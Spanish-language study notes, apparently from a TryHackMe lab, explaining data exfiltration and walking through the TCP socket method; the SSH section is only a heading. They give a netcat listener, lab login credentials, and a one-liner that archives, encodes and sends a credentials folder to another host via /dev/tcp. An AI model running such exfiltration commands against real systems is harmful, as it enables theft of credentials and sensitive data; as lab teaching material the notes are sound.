# Filtración Datos

# Objetivos de Aprendizaje

- Que es la filtración de datos?
- Entender la filtració nde datos y como se usa
- Practicas protocolos: Sockets, SSH, ICMP, HTTP(s) y DNS
- Practicas comunicaciones con C2 o varios protocolos
- Practicar entablar Tueneles del DNS y HTTP

# Infraestructura de red

![image](https://github.com/user-attachments/assets/d21197ed-d328-4357-8d08-ad0c560eb1ac)

# Filtración de datos

Filtración de datos es el proceso de coger o copiar datos sensibles sin autorización de dentro de una organización o red para fuera. Es importante anotar que este tipo de filtarción compromete el proceso y da también acceso a la red dando varios accesos y datos sensibles.

Se puede denominar como información sensible:

- Usuarios y contraseñas
- Detalles de cuentas
- Estrategias de negocio
- Llaves criptograficas
- Empleados y información personal
- Projeto de codigo de datos

## Como se puede hacer

Hay teres casos o escenarios

- Filtración de datos
- C2
- Tuneling

### Tradicional

Es simplemente mover datos de dentro de la red a fuera.

### C2

Mover los datos a traver de un C2

### Tunneling

Mover a traves de un canal de comunicaciones creado

# Filtración Usando Sockets TCP

Esta exfiltración es muy fácil de detectar si tenemos los protocolo bien configurados.

Dentras de los TCP sockets, tenemos varias tectnicas, incluyendo codificación de datos y archivar. Uno de los beneficios de estas tecnicas es codificar los datos durante la transmisión y hacer que sea más dificil examinar.

El siguiente diagrama explicar como las comunicaciones TCP funcionan.

![image](https://github.com/user-attachments/assets/b2c034f1-1987-41c6-bafe-3ef31446c30a)

1- Primero de todo nos Conectamos via el puerto 1337
2- La otra maquina se conecta al puerto especifico. Por ejemplo un nc 1.2.3.4 1337
3- La primera máquina entabla conexión
4- Finalmente, se mandan los datos y se reciben los resultados

Las comunicaciones TCP requieren obviamente dos máquinas, una victima y una tacante, que transfiere los datos. Vamos a usar el entorno de red para practicar

Necesitaremos preapar un listener a un puerto espeficio

```
nc -lvnp 8080 > /rmp/task4-creds.data
```

Estamos haciendo que recibamos los datos por el 8080, una vez recibidos se guarden el archivo que hemos marcado

Vamos a conectar la máquina victima que cuente los datos y transmitir lo que necesitamos

```
ssh thm@ip -p 2022
```
thm:tryhackme

Nosotros necesitamos los datos transmitidos en este caso

```
cat task4/creds.txt
```
Transpasar los datos:

```
tar zcf - task4/ | base64 | dd conv=ebcdic > /dev/tcp/192.168.0.133/8080
```

```
thm@jump-box$ nc -lvp 8080 > /tmp/task4-creds.data
Listening on [0.0.0.0] (family 0, port 8080)
Connection from 192.168.0.101 received!

thm@jump-box$ ls -l /tmp/
-rw-r--r-- 1 root root       240 Apr  8 11:37 task4-creds.data
```

Descomprimimos

```
tar xvf credenciales
```

# Filtración Usando SSH





